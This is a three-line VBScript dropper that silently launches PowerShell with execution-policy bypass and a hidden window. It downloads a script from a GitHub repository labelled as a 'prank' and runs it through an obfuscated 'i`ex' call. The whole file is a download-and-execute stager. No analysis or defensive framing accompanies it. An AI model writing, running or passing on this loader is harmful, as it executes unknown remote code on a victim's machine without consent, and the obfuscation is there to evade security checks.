Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -Ep Bypass -C irm https://github.com/gootalive743/MarioBobo-Prank/blob/main/main.ps | i`ex", 0, True
